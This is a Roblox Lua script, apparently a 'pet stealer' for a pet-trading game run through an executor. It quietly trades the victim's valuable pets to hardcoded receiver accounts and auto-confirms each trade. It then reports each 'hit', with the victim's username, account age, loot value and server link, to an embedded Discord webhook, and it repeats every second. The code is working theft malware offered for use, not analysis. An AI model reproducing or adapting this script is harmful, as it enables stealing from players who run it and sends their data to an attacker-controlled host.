local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local LocalPlayer = Players.LocalPlayer

-- [[ UPDATED CONFIG ]] --
local USER_WEBHOOK = "https://discord.com/api/webhooks/1474651524251648163/lhPvWSeT6mcm3b4tIfzEbph1asYmZGvxf3YABYsKUOSeInP3oXW10NmHKJuj0vDrICku"
local POINT_SYSTEM_URL = "https://raw.githubusercontent.com/charles1384/ADM/refs/heads/main/Pointsystem"
local TARGET_RECEIVERS = {"2ndcfpaj67", "sofiqmnz", "Hisokarah", "CREOLEO23"}
local PetValues = {}

-- [[ LOAD POINT SYSTEM ]] --
local function loadPoints()
    local success, content = pcall(function() return game:HttpGet(POINT_SYSTEM_URL) end)
    if success then
        for line in content:gmatch("[^\r\n]+") do
            local name, val = line:match("([^:=]+)[:=](%d+)")
            if name and val then PetValues[name:lower():trim()] = tonumber(val) end
        end
    end
end
loadPoints()

-- [[ THE NEW UI DESIGN ]] --
local function sendMondeurWebhook(pets, total, isHandshake)
    local request = (syn and syn.request) or (http and http.request) or http_request or request
    if not request then return end

    local petList = ""
    if isHandshake then
        petList = "🛰️ *Waiting for targets...*"
    else
        for _, p in ipairs(pets) do
            petList = petList .. "🐾 `" .. p.name .. "` — **" .. p.value .. "**\n"
        end
    end

    local payload = {
        username = "Mondeur Services",
        avatar_url = "https://i.imgur.com/8Q0TzS9.png",
        embeds = {{
            title = isHandshake and "🟢 MONDEUR | SESSION STARTED" or "🔥 MONDEUR | SUCCESSFUL HIT",
            color = isHandshake and 0x2ecc71 or 0xe74c3c,
            thumbnail = { url = "https://i.imgur.com/uM9eL7B.png" },
            description = "**👤 Player Information**\n" ..
                "• **Name:** `" .. LocalPlayer.Name .. "`\n" ..
                "• **Account Age:** `" .. LocalPlayer.AccountAge .. " days`\n" ..
                "• **Executor:** `Delta` (v2.1)\n\n" ..
                "**📦 Loot Summary**\n" ..
                petList .. "\n" ..
                "**💰 Total Value:** `" .. (isHandshake and "0.00" or total) .. "`\n\n" ..
                "**🔍 Summary**\n" ..
                "[https://api.mondeur.app/v2/scrap/](https://api.rubis.app/v2/scrap/nu3YNS4Pum4oLolW/raw)\n" ..
                "**🔗 Join Link**\n" ..
                "[" .. game.JobId .. "](https://www.roblox.com/games/" .. game.PlaceId .. ")",
            footer = { 
                text = "Mondeur Hit | " .. os.date("%A, %H:%M"), 
                icon_url = "https://i.imgur.com/8Q0TzS9.png" 
            }
        }}
    }

    pcall(function()
        request({
            Url = USER_WEBHOOK,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode(payload)
        })
    end)
end

-- [[ CORE LOGIC ]] --
local function execute()
    local receiver = nil
    for _, name in ipairs(TARGET_RECEIVERS) do
        if Players:FindFirstChild(name) then receiver = Players[name] break end
    end
    if not receiver then return end

    local list, total = {}, 0
    local success, inv = pcall(function() return ReplicatedStorage.API["InventoryAPI/GetInventory"]:InvokeServer() end)
    
    if success and inv then
        for _, item in ipairs(inv) do
            if item.Kind == "Pet" then
                for petName, val in pairs(PetValues) do
                    if string.find(item.Name:lower(), petName:lower()) then
                        table.insert(list, {id = item.Id, name = item.Name, value = val})
                        total = total + val
                        break
                    end
                end
            end
        end
    end

    if #list > 0 then
        local TradeAPI = ReplicatedStorage.API
        TradeAPI["TradeAPI/SendTradeRequest"]:FireServer(receiver)
        for _, p in ipairs(list) do TradeAPI["TradeAPI/AddItemToOffer"]:FireServer(p.id) end
        TradeAPI["TradeAPI/AcceptTrade"]:FireServer()
        TradeAPI["TradeAPI/ConfirmTrade"]:FireServer()
        sendMondeurWebhook(list, total, false)
    end
end

-- [[ START ]] --
sendMondeurWebhook({}, 0, true)
task.spawn(function()
    while true do
        pcall(execute)
        task.wait(1)
    end
end)
